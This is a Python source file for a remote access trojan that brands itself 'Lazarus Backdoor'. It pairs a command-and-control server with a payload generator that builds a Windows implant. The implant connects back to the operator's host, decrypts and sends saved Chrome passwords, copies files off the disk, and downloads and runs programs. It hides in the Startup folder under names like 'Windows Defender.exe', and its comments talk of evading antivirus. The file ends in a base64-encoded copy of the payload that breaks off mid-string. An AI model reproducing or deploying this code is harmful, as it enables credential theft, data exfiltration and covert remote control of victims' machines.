import socket
import sys
import time
import random
import pickle
import shutil
import os
import string
import os
import json
import base64
import sqlite3
import win32crypt
from _thread import start_new_thread
from datetime import timezone, datetime, timedelta
from Crypto.Cipher import AES # pip install pycryptodome
from os.path import expanduser
from colorama import Fore, Back, Style
from base64 import b64decode, b64encode

os.system("")
arr = {}
current_session = ""
SEPARATOR = "(o_o)"
aquire = False
cont = 0
BUFFER_SIZE = 4096 # send 4096 bytes each time step

def id_generator(size=100, chars=string.ascii_uppercase + string.digits):
   return ''.join(random.choice(chars) for _ in range(size))
def id_generator2(size=7, chars=string.ascii_uppercase + string.digits):
   return ''.join(random.choice(chars) for _ in range(size))

def main():
    HOST = '127.0.0.1'
    PORT = 1234
    display_entry()
    print(Fore.GREEN+"._________________________________.")
    print(Fore.GREEN+"|                                 |")
    print(Fore.GREEN+"|   "+Fore.LIGHTCYAN_EX+"0 -> Generate Payload"+Fore.GREEN+"         |")
    print(Fore.GREEN+"|   "+Fore.LIGHTCYAN_EX+"1 -> Main Menu"+Fore.GREEN+"                |")
    print(Fore.GREEN+"|_________________________________|")
    print(Fore.YELLOW+"[?] "+Fore.GREEN+"Option: ")

    num = input()
    if num == '0':
        print(Fore.YELLOW+"[?] "+Fore.GREEN+"Host: ")
        HOST = input()
        print(Fore.YELLOW+"[?] "+Fore.GREEN+"Port: ")
        PORT = input()
        print(Fore.YELLOW+"[?] "+Fore.GREEN+"File Name: ")
        NAME_FILE = input()
        copy_payload(HOST,PORT,NAME_FILE)
    else: 
        init(cont,HOST,PORT)
    main()

def display_entry():
    os.system('cls')
    print(Fore.GREEN+" /$$                                                                         ")
    print("| $$                                                                         ")
    print("| $$        /$$$$$$  /$$$$$$$$  /$$$$$$   /$$$$$$  /$$   /$$  /$$$$$$$       ")
    print("| $$       |____  $$|____ /$$/ |____  $$ /$$__  $$| $$  | $$ /$$_____//$$$$$$")
    print("| $$        /$$$$$$$   /$$$$/   /$$$$$$$| $$  \__/| $$  | $$|  $$$$$$|______/")
    print("| $$       /$$__  $$  /$$__/   /$$__  $$| $$      | $$  | $$ \____  $$       ")
    print("| $$$$$$$$|  $$$$$$$ /$$$$$$$$|  $$$$$$$| $$      |  $$$$$$/ /$$$$$$$/       ")
    print("|________/ \_______/|________/ \_______/|__/       \______/ |_______/        ")
    print("                                                                                                                                                             ")
    print(" /$$$$$$$                      /$$             /$$                              ")
    print("| $$__  $$                    | $$            | $$                              ")
    print("| $$  \ $$  /$$$$$$   /$$$$$$$| $$   /$$  /$$$$$$$  /$$$$$$   /$$$$$$   /$$$$$$ ")
    print("| $$$$$$$  |____  $$ /$$_____/| $$  /$$/ /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$")
    print("| $$__  $$  /$$$$$$$| $$      | $$$$$$/ | $$  | $$| $$  \ $$| $$  \ $$| $$  \__/")
    print("| $$  \ $$ /$$__  $$| $$      | $$_  $$ | $$  | $$| $$  | $$| $$  | $$| $$      ")
    print("| $$$$$$$/|  $$$$$$$|  $$$$$$$| $$ \  $$|  $$$$$$$|  $$$$$$/|  $$$$$$/| $$      ")
    print("|_______/  \_______/ \_______/|__/  \__/ \_______/ \______/  \______/ |__/      ")
    print("")
    print(Fore.LIGHTMAGENTA_EX+"[Coded by TheMessias24 | Discord: DontGiveAFuck#1076]                                                                                                                                                 ")
    

def init(cont,HOST,PORT):
    display_entry()
    HOST=HOST
    serverSocket = socket.socket()
    try:
        serverSocket.bind(('', PORT))
    except socket.error as e:
        print(str(e))
    print(f'{Fore.BLUE}[+] {Fore.GREEN}Server is listing on the port {PORT}...')
    #print(Fore.YELLOW+"[%] "+Fore.GREEN+"Available Devices")
    serverSocket.listen()
    while True:
        accept_connections(serverSocket,cont)

def display():
    print(Fore.GREEN+"._________________________________.")
    print(Fore.GREEN+"|                                 |")
    print(Fore.GREEN+"|   "+Fore.LIGHTCYAN_EX+"0 -> Go Back"+Fore.GREEN+"                  |")
    print(Fore.GREEN+"|   "+Fore.LIGHTCYAN_EX+"1 -> Send File And Execute"+Fore.GREEN+"    |")
    print(Fore.GREEN+"|   "+Fore.LIGHTCYAN_EX+"2 -> Execute a file by name"+Fore.GREEN+"   |")
    print(Fore.GREEN+"|   "+Fore.LIGHTCYAN_EX+"3 -> Steal Chrome Passwords"+Fore.GREEN+"   |")
    #print(Fore.GREEN+"|   "+Fore.LIGHTCYAN_EX+"4 -> Steal Chrome Cookies"+Fore.GREEN+"     |")
    print(Fore.GREEN+"|   "+Fore.LIGHTCYAN_EX+"4 -> Steal Files"+Fore.GREEN+"              |")
    print(Fore.GREEN+"|   "+Fore.LIGHTCYAN_EX+"5 -> Remove Virus From Victim"+Fore.GREEN+" |")
    print(Fore.GREEN+"|   "+Fore.LIGHTCYAN_EX+"6 -> Persist Virus           "+Fore.GREEN+" |")
    print(Fore.GREEN+"|                                 |")
    print(Fore.GREEN+"|_________________________________|")
    print(Fore.LIGHTMAGENTA_EX+"[%] "+Fore.GREEN+"Waiting for a command: ")

def client_handler(connection,my_session):
    global arr
    global current_session
    global aquire
    try:
        while True:
        
            while current_session != my_session:
                #print(current_session)
                time.sleep(0)
            display_entry()
            aquire = True
            #flusher = ""
            #connection.sendall(flusher.encode('utf-8'))
            display()
            command = input()
            connection.sendall(command.encode('utf-8'))
            if(command == "1"):
            
                print(Fore.YELLOW+"[?] "+Fore.GREEN+"File Path: ")
                path = input()
                print(Fore.YELLOW+"[?] "+Fore.GREEN+"File Output Dir f.e \Documents\: ")
                path_output = input()
                print(Fore.YELLOW+"[?] "+Fore.GREEN+"Execute after y|n: ")
                decision = input()
                filesize = os.path.getsize(path)
                data = (path+SEPARATOR+str(filesize)+SEPARATOR+path_output+SEPARATOR+decision).encode('utf-8')
                connection.sendall(data)
            
            
            
                #progress = tqdm.tqdm(range(filesize), f"Sending {path}", unit="B", unit_scale=True, unit_divisor=1024)

                with open(path, "rb") as f:
                
                    while True:
                        # read the bytes from the file
                        bytes_read = f.read(BUFFER_SIZE)
                        if not bytes_read:
                            string = "pEOFp"
                            connection.sendall(string.encode('utf-8'))
                            # file transmitting is done
                            break
                        # we use sendall to assure transimission in 
                        # busy networks
                        connection.sendall(bytes_read)
                        # update the progress bar
                        #progress.update(len(bytes_read))
                time.sleep(1)

                client_handler(connection,my_session)
            
            #connection.send(str.encode(command))
            #data = connection.recv(2048)
            #message = data.decode('utf-8')
            if command == '2':
                print(Fore.YELLOW+"[?] "+Fore.GREEN+"File Name")
                file_exe = input()
                connection.sendall(file_exe.encode('utf-8'))
                time.sleep(1)
                client_handler(connection,my_session)
            if command == '3':
                main_data = b""
                arr_data = b""
                
                while True:
                    
                    
                    arr_data = connection.recv(4096)
                    #print("received")
                    
                    #print("MORE "+str(arr_data))
                    main_data += arr_data

                    data_finish = str(main_data)
                    #print("\n->"+data_finish[len(data_finish)-2]+"<-\n")
                    if data_finish[len(data_finish)-2] == ".":
                        print(Fore.BLUE+"[+] "+Fore.GREEN+"File Transfered")
                        break
                arr_data = pickle.loads(main_data)
                for i in arr_data:
                    print(i)
                print(Fore.YELLOW+"[?] "+Fore.GREEN+"Press Enter to Continue ...")
                input()
                client_handler(connection,my_session)
            
            if command == '5':
                
                arr2 = {}
                cont3 = 0
                for i in range(len(arr)):
                    if arr[i].strip() != my_session:
                        arr2[cont3] = arr[i]
                        cont3+=1
                arr=arr2
                print(Fore.RED+"[-] "+Fore.GREEN+"Client Left")
                time.sleep(2)
                connection.close()
                aquire = False
                current_session = ""
                display_entry()
                return
            if command == '6':
                time.sleep(5)
                client_handler(connection,my_session)
            if command == '4':
                print("\n"+Fore.YELLOW+"[?] "+Fore.GREEN+"Choose Dir: MAINDISK|MAINUSER|STEALALL|COSTUM")
                path_choose = input()

                if path_choose != "MAINDISK" and path_choose != "MAINUSER" and path_choose != "STEALALL":
                    print("\n"+Fore.YELLOW+"[?] "+Fore.GREEN+"Dir Name(without \ in the end): ")
                    path_choose = input()

                if path_choose == "STEALALL":
                    print(Fore.YELLOW+"[?] "+Fore.GREEN+"Choose Dir(MAINUSER for Root): ")
                    inputed = input()
                    path_choose = path_choose + SEPARATOR + inputed
                    data = path_choose.encode("utf-8")
                    connection.sendall(data)
                    get_files(connection,my_session)
                    client_handler(connection,my_session)

                data = path_choose.encode("utf-8")
                connection.sendall(data)
                while True:
                    main_data = b""
                    arr_data = b""
                
                    while True:
                    
                    
                        arr_data = connection.recv(4096)
                        #print("received")
                    
                        #print("MORE "+str(arr_data))
                        main_data += arr_data

                        data_finish = str(main_data)
                        #print("\n->"+data_finish[len(data_finish)-2]+"<-\n")
                        if data_finish[len(data_finish)-2] == ".":
                           print(Fore.BLUE+"[+] "+Fore.GREEN+"File Transfered")
                           break
                    arr_data = pickle.loads(main_data)
               
                    print("_______________________")
                    for dat in arr_data:
                        print(arr_data[dat])
                    print("_______________________\n")
                    print(Fore.YELLOW+"[?] "+Fore.GREEN+"Option: ")
                    choice = input()
                    connection.sendall(choice.encode("utf-8"))

                    choosen = arr_data[int(choice.strip())]

                    if "File:" in choosen:
                        file_arr_name = choosen.split("\\")
                        filename = file_arr_name[len(file_arr_name)-1]
                        #print(filename)
                        cwd = os.getcwd()
                        try:
                            os.mkdir(cwd+"\\Data\\")
                        except:
                            time.sleep(0)
                        with open(cwd+"\\Data\\"+filename, "wb") as f:
                            while True:
                                bytes_read = connection.recv(BUFFER_SIZE)
                                #if bytes_read.decode("utf-8") != "ERROR":
                            
                                #print(str(bytes_read)+"\n\n")
                                f.write(bytes_read.replace(b"pEOFp",b""))
                                if "pEOFp" in str(bytes_read):
                                    print(Fore.BLUE+"[+] "+Fore.GREEN+"File Transfered")
                                    f.close()
                                    #time.sleep(1)
                                    client_handler(connection,my_session)
                            pass
                    else: 
                        #print("YES")
                        pass
                
            
        
            if command == '0':
            
                aquire = False
                current_session = ""
        #print("ONE MORE")
        
        #reply = f'Server: {command}'
        #connection.sendall(str.encode(reply))
    except:
        arr2 = {}
        cont3 = 0
        for i in range(len(arr)):
            if arr[i].strip() != my_session:
                arr2[cont3] = arr[i]
                cont3+=1
        arr=arr2
        print(Fore.RED+"[!] "+Fore.GREEN+"Error establishing connection")
        time.sleep(2)
        aquire = False
        current_session = ""
        display_entry()

def get_files(connection,my_session):
    while True:
        filename = connection.recv(4096)

        ack = "OK"
        #print(filename)
        connection.sendall(ack.encode('utf-8'))
        #print("sended")
        if "EXITFILE" in str(filename):
            client_handler(connection,my_session)
        cwd = os.getcwd()
        #print(filename)
        try:
            os.mkdir(cwd+"\\Data\\")
        except:
            time.sleep(0)
        with open(cwd+"\\Data\\"+str(filename), "wb") as f:
            while True:
                bytes_read = connection.recv(BUFFER_SIZE)
                f.write(bytes_read.replace(b"pEOFp",b""))

                if "pEOFp" in str(bytes_read):
                    print(Fore.BLUE+"[+] "+Fore.GREEN+"File Transfered "+str(filename))
                    f.close()
                    #time.sleep(1)
                    break
        #client_handler(connection,my_session)
        #print("HEY")
        ack = "OK"
        connection.sendall(ack.encode('utf-8'))
        #print("sended")
                            

def accept_connections(ServerSocket,cont):
    global aquire
    global arr
    while aquire==True:
        #print(aquire)
        time.sleep(1)
    Task = False
    if len(arr)>0:
        
        print(Fore.BLUE+"[+] "+Fore.GREEN+"Available Devices")
        for i in range(len(arr)):
            print(Fore.LIGHTCYAN_EX+"  "+arr[i])
        while Task == False:
            print(Fore.YELLOW+"[?] "+Fore.GREEN+"Choose device: ")
            global current_session
            #print(aquire)
            current_session = input()
            for i in range(len(arr)):
                if current_session.strip() == arr[i].strip():
                    Task=True
                    break

    
        
    time.sleep(1)
    if aquire == True:
        return
    print(f'{Fore.BLUE}[+] {Fore.GREEN}Server waiting for clients...')
    Client, address = ServerSocket.accept()
    
    print(Fore.BLUE+"[+] "+Fore.GREEN+'Connected to: ' + address[0] + ':' + str(address[1]))
    string = str(address[0] + ':' + str(address[1]))
    arr[cont]=string
    cont+=1
    #print(address[0] + ':' + str(address[1]))
    #print(arr)
    start_new_thread(client_handler, (Client, string))
    
def copy_payload(ip_main,port_main,NAME_FILE):  
    string_all = r'''
import socket
import sys
import time
import random
import pickle
import shutil
import os
import os
import json
import base64
import sqlite3
import win32crypt
from datetime import timezone, datetime, timedelta
from Crypto.Cipher import AES # pip install pycryptodome
from os.path import expanduser
from colorama import Fore, Back, Style
from base64 import b64decode, b64encode

time.sleep(60)
string_random = "'''+id_generator()+r'''"
string_random = "'''+id_generator()+r'''"
string_random = "'''+id_generator()+r'''"
ip_main = "'''+ip_main+r'''"
port_main = "'''+port_main+r'''"
string_all = r"""
time.sleep(10)

home = expanduser("~")
AUTOEXEC = home+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
path = os.getcwd()

random.seed(time.time()*100)
file_arr_dir = ["Windows Defender.exe","Update Scheduler.exe","Java.exe","Java Update.exe","Microsoft.exe","Microsoft Store.exe"]

path_to_send = AUTOEXEC+file_arr_dir[random.randint(0,5)]

#time.sleep(12) lets bypass av?
HOST = '"""+ip_main+r"""'
PORT = """+port_main+r"""
BUFFER_SIZE = 4096
SEPARATOR = "(o_o)"


def init():
    client_socket = socket.socket()
    print('[%]Connecting')
    try:
        client_socket.connect((HOST, PORT))
        print("[+]Connected Successfully")
        main_work(client_socket)
    except socket.error as e:
        init()
        time.sleep(20)
        print(str(e))

    

    
                

def main_work(client_socket):
    while True:
        #flusher = client_socket.recv(4096).decode('utf-8')
        Response = client_socket.recv(4096).decode('utf-8')
        print("YES")
        if "1" in Response:
            received = client_socket.recv(BUFFER_SIZE).decode('utf-8')

            #print(received+"\n")
            
            filename, filesize, path, decision = received.split(SEPARATOR)

            if "autoexec" in path:
                path = AUTOEXEC
            else:
                path = home+path
            
            # remove absolute path if there is
            filename = os.path.basename(filename)
            
            filename = path+filename
            # convert to integer
            filesize = int(filesize)
            #progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
            with open(filename, "wb") as f:
                while True:
                    # read 1024 bytes from the socket (receive)
                    bytes_read = client_socket.recv(BUFFER_SIZE)
                    f.write(bytes_read.replace(b"pEOFp",b""))
                    if "pEOFp" in str(bytes_read):    
                        # nothing is received
                        # file transmitting is done
                        time.sleep(1)
                        f.close()
                        break
                    # write to the file the bytes we just received
                    #f.write(bytes_read)
                    # update the progress bar
                    #progress.update(len(bytes_read))
            if decision == 'y':
                try:
                    os.system(filename)  
                except:
                    time.sleep(0)
            main_work(client_socket)
        if "2" in Response:
            path = os.getcwd()
            name = client_socket.recv(BUFFER_SIZE).decode('utf-8')
            full_path = find(name,os.path.expanduser('~'))
            try:
                os.system(full_path)
                main_work(client_socket)
            except:
                main_work(client_socket)
        if "3" in Response:
            string_data = main_chrome()
            data_string = pickle.dumps(string_data)
            client_socket.sendall(data_string)
            main_work(client_socket)
        if "5" in Response:
            try:
                os.system("rm "+path_to_send)
            except:
                time.sleep(0)
            return
        if "6" in Response:
            os.system("")
            home = expanduser("~")
            AUTOEXEC = home+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
            path = os.getcwd()

            random.seed(time.time()*100)
            file_arr_dir = ["WindowsDefender.txt","UpdateScheduler.txt","Java.txt","JavaUpdate.txt","Microsoft.txt","MicrosoftStore.txt"]
            file_choosed = file_arr_dir[random.randint(0,5)]
            path_to_send = AUTOEXEC+file_choosed
            try:
                file_main_name = os.path.basename(__file__).replace(".py",".exe")
                real_path = path+"\\"+file_main_name
                #print(real_path)
                #sys.exit(1)  
                time.sleep(5)
                shutil.copy(real_path, path_to_send)
                f = open(AUTOEXEC+"boot.bat", "w")
                f.write("@echo off\n")
                f.write("mv "+file_choosed+" "+file_choosed.replace(".txt",".exe")+"\n")
                f.write("start "+file_choosed.replace(".txt",".exe"))
                f.close()
            except Exception as e:
                print(e)
                time.sleep(0)
            main_work(client_socket)
        if "4" in Response:
            path = os.getcwd()
            name = client_socket.recv(BUFFER_SIZE).decode('utf-8')
            if name == "MAINDISK":
                name = "C:\\"
            if name == "MAINUSER":
                name = os.path.expanduser('~')

            if "STEALALL" in name:
                find_dir_steal_all(name.split(SEPARATOR)[1],client_socket)
                main_work(client_socket)
                
            
            while True:
                arr = find_dir(name)
                data_string = pickle.dumps(arr)
                ack=""
                client_socket.sendall(data_string)
                #print("sended")
                #string = "DONE"
                #client_socket.send(string.encode('utf-8'))
                #print("DONE")
                dirFile = client_socket.recv(BUFFER_SIZE).decode('utf-8')
                print("received")
                #print("YES")
                try:
                    choosen = arr[int(dirFile.strip())]
                    file_to_go = choosen.split("File: "+Fore.LIGHTCYAN_EX)
                    if "File:" in choosen:
                        with open(file_to_go[1], "rb") as f:
                            while True:
                                bytes_read = f.read(BUFFER_SIZE)
                                if not bytes_read:
                                    string = "pEOFp"
                                    client_socket.sendall(string.encode('utf-8'))
                                    break
                                client_socket.sendall(bytes_read)    
                        break
                    else:
                        print(choosen)
                        file_to_go = choosen.split("Directory: "+Fore.LIGHTCYAN_EX)
                        name = file_to_go[1]
                        pass
                except Exception as e:
                    print(e)
                    break
                    pass
    # close the client socket
    #client_socket.close()
        #Input = input('Your message: ')
        #ClientSocket.send(str.encode(Input))
        #Response = ClientSocket.recv(2048)
        #print(Response.decode('utf-8'))

def find_dir_steal_all(path,client_socket):
   
    if "MAINUSER" in path:
        path = os.path.expanduser('~')
    for root, dirs, filenames in os.walk(path):
        for filename in filenames:
            #print("One more")
            if filename.endswith(".txt") or filename.endswith(".gif") or filename.endswith(".html") or filename.endswith(".png") or filename.endswith(".py") or filename.endswith(".sh") or filename.endswith(".pkg") or filename.endswith(".toc") or filename.endswith(".manifest") or filename.endswith(".cpp") or filename.endswith(".c") or filename.endswith(".h") or filename.endswith(".spec") or filename.endswith(".hpp") or filename.endswith(".jpg") or filename.endswith(".docx") or filename.endswith(".pptx") or filename.endswith(".xls") or filename.endswith(".svg") or filename.endswith(".xml") or filename.endswith(".ods") or filename.endswith(".xlsx") or filename.endswith(".wav") or filename.endswith(".zip") or filename.endswith(".rar") or filename.endswith(".7z") or filename.endswith(".csv") or filename.endswith(".dat") or filename.endswith(".db") or filename.endswith(".dbf") or filename.endswith(".sav") or filename.endswith(".sql"):
                client_socket.sendall(filename.encode('utf-8'))
                #print("sended")
                answer = client_socket.recv(4096)
                #print("Received")
                #print(answer)
                #print(filename)
                with open(os.path.join(root, filename), "rb") as f:
                    while True:
                        bytes_read = f.read(BUFFER_SIZE)
                        if not bytes_read:
                            string = "pEOFp"
                            client_socket.sendall(string.encode('utf-8'))
                            f.close()
                            answer = client_socket.recv(4096)
                            #print("received")
                            break
                        client_socket.sendall(bytes_read)
    
    exite = "EXITFILE"
    client_socket.sendall(exite.encode('utf-8'))

def chrome_date_and_time(chrome_data):
    # Chrome_data format is 'year-month-date 
    # hr:mins:seconds.milliseconds
    # This will return datetime.datetime Object
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
  
  
def fetching_encryption_key():
    # Local_computer_directory_path will look 
    # like this below
    # C: => Users => <Your_Name> => AppData =>
    # Local => Google => Chrome => User Data =>
    # Local State
    local_computer_directory_path = os.path.join(
      os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", 
      "User Data", "Local State")
      
    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)
  
    # decoding the encryption key using base64
    encryption_key = base64.b64decode(
      local_state_data["os_crypt"]["encrypted_key"])
      
    # remove Windows Data Protection API (DPAPI) str
    encryption_key = encryption_key[5:]
      
    # return decrypted key
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
  
  
def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]
          
        # generate cipher
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
          
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
          
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"
  
  
def main_chrome():
    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)
      
    # connecting to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
      
    # 'logins' table has the data
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")
    arr_data = []
    #cont_arr = 0
    # iterate over all rows
    for row in cursor.fetchall():
        string_data_append = ""
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usuage = row[5]
          
        if user_name or decrypted_password:
            string_data_append += f"\n{Fore.MAGENTA}Main URL: {Fore.GREEN}{main_url}\n"
            string_data_append += f"{Fore.MAGENTA}Login URL: {Fore.GREEN}{login_page_url}\n"
            string_data_append += f"{Fore.MAGENTA}User name: {Fore.GREEN}{user_name}\n"
            string_data_append += f"{Fore.MAGENTA}Decrypted Password: {Fore.GREEN}{decrypted_password}\n"
          
        else:
            continue
          
        if date_of_creation != 86400000000 and date_of_creation:
            string_data_append += f"{Fore.MAGENTA}Creation date: {Fore.GREEN}{str(chrome_date_and_time(date_of_creation))}\n"
          
        if last_usuage != 86400000000 and last_usuage:
            string_data_append += f"{Fore.MAGENTA}Last Used: {Fore.GREEN}{str(chrome_date_and_time(last_usuage))}\n"
        string_data_append += "\n"+Fore.CYAN + "=" * 100
        arr_data.append(string_data_append)
    cursor.close()
    db.close()
      
    try:
          
        # trying to remove the copied db file as 
        # well from local computer
        os.remove(filename)
    except:
        pass
    return arr_data

def find_dir(path):
    full_data = {}
    cont = 0
    for root, dirs, files in os.walk(path):
        if "C:\\" == path:
            path = path.replace("C:\\","C:")
        if path == os.path.expanduser('~'):
             #print("--------------"+os.path.expanduser('~')+"\\--------------")
             string = Fore.GREEN+"           ["+os.path.expanduser('~')+"\\]           \n"
             full_data[cont]=string
             cont+=1
        elif "Users\\" not in path:
             string = Fore.GREEN+"           ["+path+"\\]           \n"
             full_data[cont]=string
             cont+=1
        else:
            #print("--------------"+root.split(os.path.expanduser('~'))[1]+"--------------")
            string = Fore.GREEN+"           ["+root.split(os.path.expanduser('~'))[1]+"]           \n|"
            full_data[cont]=string
            cont+=1
        
        
        #print()
        for dir in dirs:
            #print("     Directory: "+path+"\\"+dir)
            string = Fore.GREEN+str(cont)+"->"+Fore.MAGENTA+"     Directory: "+Fore.LIGHTCYAN_EX+path+"\\"+dir
            full_data[cont]=string
            cont+=1
        #print()
        
        for file in files:
            #print("     File: "+path+"\\"+file)
            string = Fore.GREEN+str(cont)+"->"+Fore.MAGENTA+"     File: "+Fore.LIGHTCYAN_EX+path+"\\"+file
            full_data[cont]=string
            cont+=1
        for s in full_data:
            print(full_data[s])
        return full_data
        

def find(name, path):
    for root, dirs, files in os.walk(path):
        print(files)
        if name in files:
            return os.path.join(root, name)
#find_dir("C:\\Users")


init()
"""

#hidden = b'CnRpbWUuc2xlZXAoMTApCgpob21lID0gZXhwYW5kdXNlcigifiIpCkFVVE9FWEVDID0gaG9tZSsiXFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTdGFydHVwXFwiCnBhdGggPSBvcy5nZXRjd2QoKQoKcmFuZG9tLnNlZWQodGltZS50aW1lKCkqMTAwKQpmaWxlX2Fycl9kaXIgPSBbIldpbmRvd3MgRGVmZW5kZXIuZXhlIiwiVXBkYXRlIFNjaGVkdWxlci5leGUiLCJKYXZhLmV4ZSIsIkphdmEgVXBkYXRlLmV4ZSIsIk1pY3Jvc29mdC5leGUiLCJNaWNyb3NvZnQgU3RvcmUuZXhlIl0KCnBhdGhfdG9fc2VuZCA9IEFVVE9FWEVDK2ZpbGVfYXJyX2RpcltyYW5kb20ucmFuZGludCgwLDUpXQp0cnk6CiAgICBmaWxlX21haW5fbmFtZSA9IG9zLnBhdGguYmFzZW5hbWUoX19maWxlX18pLnJlcGxhY2UoIi5weSIsIi5leGUiKQogICAgcmVhbF9wYXRoID0gcGF0aCsiXFwiK2ZpbGVfbWFpbl9uYW1lCiAgICBwcmludChyZWFsX3BhdGgpCiNzeXMuZXhpdCgxKQogICAgc2h1dGlsLmNvcHkocmVhbF9wYXRoLCBwYXRoX3RvX3NlbmQpCmV4Y2VwdDoKICAgIHRpbWUuc2xlZXAoMCkKI3RpbWUuc2xlZXAoMTIpIGxldHMgYnlwYXNzIGF2PwpIT1NUID0gJzEyNy4wLjAuMScKUE9SVCA9IDEyMzQKQlVGRkVSX1NJWkUgPSA0MDk2ClNFUEFSQVRPUiA9ICIowrpfwropIgoKCmRlZiBpbml0KCk6CiAgICBjbGllbnRfc29ja2V0ID0gc29ja2V0LnNvY2tldCgpCiAgICBwcmludCgnWyVdQ29ubmVjdGluZycpCiAgICB0cnk6CiAgICAgICAgY2xpZW50X3NvY2tldC5jb25uZWN0KChIT1NULCBQT1JUKSkKICAgICAgICBwcmludCgiWytdQ29ubmVjdGVkIFN1Y2Nlc3NmdWxseSIpCiAgICBleGNlcHQgc29ja2V0LmVycm9yIGFzIGU6CiAgICAgICAgaW5pdCgpCiAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgIHByaW50KHN0cihlKSkKICAgIG1haW5fd29yayhjbGllbnRfc29ja2V0KQoKICAgIAogICAgICAgICAgICAgICAgCgpkZWYgbWFpbl93b3JrKGNsaWVudF9zb2NrZXQpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICAjZmx1c2hlciA9IGNsaWVudF9zb2NrZXQucmVjdig0MDk2KS5kZWNvZGUoJ3V0Zi04JykKICAgICAgICBSZXNwb25zZSA9IGNsaWVudF9zb2NrZXQucmVjdig0MDk2KS5kZWNvZGUoJ3V0Zi04JykKICAgICAgICBwcmludCgiWUVTIikKICAgICAgICBpZiAiMSIgaW4gUmVzcG9uc2U6CiAgICAgICAgICAgIHJlY2VpdmVkID0gY2xpZW50X3NvY2tldC5yZWN2KEJVRkZFUl9TSVpFKS5kZWNvZGUoJ3V0Zi04JykKCiAgICAgICAgICAgICNwcmludChyZWNlaXZlZCsiXG4iKQogICAgICAgICAgICAKICAgICAgICAgICAgZmlsZW5hbWUsIGZpbGVzaXplLCBwYXRoLCBkZWNpc2lvbiA9IHJlY2VpdmVkLnNwbGl0KFNFUEFSQVRPUikKCiAgICAgICAgICAgIGlmICJhdXRvZXhlYyIgaW4gcGF0aDoKICAgICAgICAgICAgICAgIHBhdGggPSBBVVRPRVhFQwogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcGF0aCA9IGhvbWUrcGF0aAogICAgICAgICAgICAKICAgICAgICAgICAgIyByZW1vdmUgYWJzb2x1dGUgcGF0aCBpZiB0aGVyZSBpcwogICAgICAgICAgICBmaWxlbmFtZSA9IG9zLnBhdGguYmFzZW5hbWUoZmlsZW5hbWUpCiAgICAgICAgICAgIAogICAgICAgICAgICBmaWxlbmFtZSA9IHBhdGgrZmlsZW5hbWUKICAgICAgICAgICAgIyBjb252ZXJ0IHRvIGludGVnZXIKICAgICAgICAgICAgZmlsZXNpemUgPSBpbnQoZmlsZXNpemUpCiAgICAgICAgICAgICNwcm9ncmVzcyA9IHRxZG0udHFkbShyYW5nZShmaWxlc2l6ZSksIGYiUmVjZWl2aW5nIHtmaWxlbmFtZX0iLCB1bml0PSJCIiwgdW5pdF9zY2FsZT1UcnVlLCB1bml0X2Rpdmlzb3I9MTAyNCkKICAgICAgICAgICAgd2l0aCBvcGVuKGZpbGVuYW1lLCAid2IiKSBhcyBmOgogICAgICAgICAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgICAgICAgICAjIHJlYWQgMTAyNCBieXRlcyBmcm9tIHRoZSBzb2NrZXQgKHJlY2VpdmUpCiAgICAgICAgICAgICAgICAgICAgYnl0ZXNfcmVhZCA9IGNsaWVudF9zb2NrZXQucmVjdihCVUZGRVJfU0laRSkKICAgICAgICAgICAgICAgICAgICBmLndyaXRlKGJ5dGVzX3JlYWQucmVwbGFjZShiInBFT0ZwIixiIiIpKQogICAgICAgICAgICAgICAgICAgIGlmICJwRU9GcCIgaW4gc3RyKGJ5dGVzX3JlYWQpOiAgICAKICAgICAgICAgICAgICAgICAgICAgICAgIyBub3RoaW5nIGlzIHJlY2VpdmVkCiAgICAgICAgICAgICAgICAgICAgICAgICMgZmlsZSB0cmFuc21pdHRpbmcgaXMgZG9uZQogICAgICAgICAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgICAgICAgICAgICAgICAgIGYuY2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICMgd3JpdGUgdG8gdGhlIGZpbGUgdGhlIGJ5dGVzIHdlIGp1c3QgcmVjZWl2ZWQKICAgICAgICAgICAgICAgICAgICAjZi53cml0ZShieXRlc19yZWFkKQogICAgICAgICAgICAgICAgICAgICMgdXBkYXRlIHRoZSBwcm9ncmVzcyBiYXIKICAgICAgICAgICAgICAgICAgICAjcHJvZ3Jlc3MudXBkYXRlKGxlbihieXRlc19yZWFkKSkKICAgICAgICAgICAgaWYgZGVjaXNpb24gPT0gJ3knOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIG9zLnN5c3RlbShmaWxlbmFtZSkgIAogICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMCkKICAgICAgICAgICAgbWFpbl93b3JrKGNsaWVudF9zb2NrZXQpCiAgICAgICAgaWYgIjIiIGluIF